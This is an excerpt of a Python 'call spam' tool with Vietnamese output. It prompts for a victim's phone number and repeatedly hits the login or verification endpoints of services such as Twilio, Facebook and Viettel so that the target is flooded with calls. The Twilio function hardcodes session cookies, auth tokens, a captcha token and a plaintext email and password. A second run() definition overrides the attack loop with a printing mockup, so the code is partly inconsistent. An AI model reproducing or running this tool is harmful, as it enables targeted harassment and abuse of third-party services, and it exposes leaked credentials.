...
# Hàm in banner
def print_banner():
    banner = f"""\033[1;34m█ \033[1;32mBản Quyền Tool Thuộc:\033[1;31m Thomas Lee"""
    for char in banner:
...
def twilio(phone):
    cookies = {
        'at_check': 'true',
        'AMCVS_32523BB96217F7B60A495CB6%40AdobeOrg': '1',
        'AMCV_32523BB96217F7B60A495CB6%40AdobeOrg': '179643557%7CMCIDTS%7C20014%7CMCMID%7C13506285649309102487537321586869006212%7CMCOPTOUT-1729190469s%7CNONE%7CvVersion%7C5.5.0',
        'mbox': 'session#bb9ca083329948fca789e9885c8d580c#1729185130|PC#bb9ca083329948fca789e9885c8d580c.38_0#1792428070',
        '_cq_duid': '1.1729183294.W9gY6Lgxw9HuWOCF',
        '_cq_suid': '1.1729183294.YIiqkw2tHobRUcH0',
        'did': 's%3Av0%3Aa615da58-12a5-46d6-ac35-283689776660%3Aea7159c9b606ab016e890e2f66e8149b8235387a8250bc96a3c45e5c39df003a.530lxh6%2FEqPIpxznOxgtMi2n1MuWW6PdCA%2FCZsDAUDk',
        'auth0': 's%3AMo1xYwWidsoB020W_ev0LE2WRbP52VSG.uS1VO1cQU7uab0m5v5g3FSFDhTOf1umpd%2Bac0%2BiwTXI',
        'did_compat': 's%3Av0%3Aa615da58-12a5-46d6-ac35-283689776660%3Aea7159c9b606ab016e890e2f66e8149b8235387a8250bc96a3c45e5c39df003a.530lxh6%2FEqPIpxznOxgtMi2n1MuWW6PdCA%2FCZsDAUDk',
        'auth0_compat': 's%3AMo1xYwWidsoB020W_ev0LE2WRbP52VSG.uS1VO1cQU7uab0m5v5g3FSFDhTOf1umpd%2Bac0%2BiwTXI',
        'builderSessionId': 'b8c92bde6fa34c3680ccb6a121e57f06',
        '_uetsid': '18802e408ca811efab5a89f0f060659e',
        '_uetvid': '188181208ca811ef8d1deb2cb3ecd5a3',
    }

    headers = {
        'authority': 'login.twilio.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://login.twilio.com',
        'referer': 'https://login.twilio.com/u/login?state=hKFo2SAwSjhwa09QQkRKUUhRVng5Z0ZGV0d5R1lYVlFJcVZ3aqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIE5OemdFZXJvNkhRUEZWeXlOT2R1V1l2X2dMbXNoTmhto2NpZNkgTW05M1lTTDVSclpmNzdobUlKZFI3QktZYjZPOXV1cks',
    ...
    params = {
        'state': 'hKFo2SAwSjhwa09QQkRKUUhRVng5Z0ZGV0d5R1lYVlFJcVZ3aqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIE5OemdFZXJvNkhRUEZWeXlOT2R1V1l2X2dMbXNoTmhto2NpZNkgTW05M1lTTDVSclpmNzdobUlKZFI3QktZYjZPOXV1cks',
    }

    data = {
        'state': 'hKFo2SAwSjhwa09QQkRKUUhRVng5Z0ZGV0d5R1lYVlFJcVZ3aqFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIE5OemdFZXJvNkhRUEZWeXlOT2R1V1l2X2dMbXNoTmhto2NpZNkgTW05M1lTTDVSclpmNzdobUlKZFI3QktZYjZPOXV1cks',
        'username': 'tduongregeditvip001@gmail.com',
        'password': 'Tduong0987654321@',
        'captcha': '0.dOnncTL2xsdankvnftDHeBp1z5lXZFv74ZtOZQIJoWrU2WxTLOrPm5kPzQsATnzuz8OpOWBQJvKC5VgH5Kc8neCweJQlUryg92B1ofwaJCKU3utuxRya24UtJJEipt9zJiEGP04IGzTBtSYIfXj5dPMvGp6Xn33EBAJRKwGWjtnzZmHF8CHU6yCmg1CaWCDvvih5XGDl_rtSQeqwdfEpyZqKT5cdlqphSsccbRVx52Z-maj0UVtNPb133KK_WBVhzFuSqJx6Nc1nb49PScgXaaJDYgsXVHD9_uTBRSE3jh2L9iCR0msqSiPVz_7bp75t0p02-0kKdrFXZB55aTtJtdc0NhDGZJRbdTbCaKPaafayuk8I7EuQGcOiVKbODJz1r5WtaJxIZwnsqHLaaxmgP9hjA_v8TSs19U88D1x59eVUb1GQjtoghewAXkZABszNCWBE3ghUbugCUWCJuTScZDOD8c2U1pen2tFFckarhi2VVAHXlEc56J363ne8vGtO35whG5Hy5FImX3vIRStBsge-rsrs2FJWIIBJO03DiUQbj3rvoq5uxNLT8tu0M9ysAPklScKww6ycq9BHvyQ2lV3QFZwHkHqu7jBj9wda62Tr8R1dQ4Fcyty2PbKNwyVqYeWy_K4sULFT5jXVoJ5U3d8EL_2xRR7fYBS6BHqXh5bwBfH8N8mvYfqACb2zrSQo0mp6f_Nap3pSv2sCrX0JcwY3uVc9fkibAFCl52mtETsTwt7ymi-ItmIweRSqiWvw.42hR-rBgcCdmcxKeUA2qbQ.d327331d6a26d969a6f1a6e2d66539c1712f8ae09d8b8c90fc9ee5a850bdfe7b',
        'action': 'default',
    }
...
def run(sdt):
    apis = [tv360, twilio, robot, fb, dvcd, myvt, phar, one, sapo]
    while True:
        for api in apis:
            try:
                api(sdt)
                print(f"\033[1;34m█ \033[1;32mĐang Gửi Tấn Công Đến Số \033[1;36m[\033[1;33m{sdt}\033[1;36m]{hong}")
                time.sleep(2)
            except Exception as e:
                print(f"{do}LỖI")
        
        # 1 giây để tránh bị chặn nen do la li do spam cham
        time.sleep(1)
...
def chay():
    ...
    print_banner()
    print(f"\n{do_nhat}╔═════════════════════════════════════════════════════════════╗")
    print(f"{do_nhat}║ {xanhduong_sang}➣ {do}Lưu Ý: {xanhla}Đây Là Chức Năng Call Nhây (Không Có SMS){do_nhat}\t\t║")
    print(f"{do_nhat}╚═════════════════════════════════════════════════════════════╝\n")

    # Nhập số điện thoại
    sdt = input(f"{xanhduong_sang}█ {trang}Nhập số điện thoại Cần Spam Call Nhây: {do_nhat}")

    # Kiểm tra số điện thoại hợp lệ
    if sdt.isdigit() and len(sdt) == 10:
        print(f"{xanhla}█ {trang}Đang thực hiện Call Nhây cho số: {xanhla}{sdt}...\033[0m")
        run(sdt)
    else:
        print(f"{do}█ {trang}Số Điện Thoại Không Đúng Định Dạng! {xanhla}Vui lòng nhập lại số hợp lệ.\033[0m")

# Chạy một số tác vụ (function mockup)
def run(sdt):
    print(f"{xanhla}█ {trang}Đang tiến hành Call Nhây... vui lòng đợi.\033[0m")
    time.sleep(2)  # Giả lập tiến trình
    print(f"{xanhla}█ {xanhla}Call Nhây thành công cho số: {sdt}!\033[0m")
# Chạy chương trình
chay()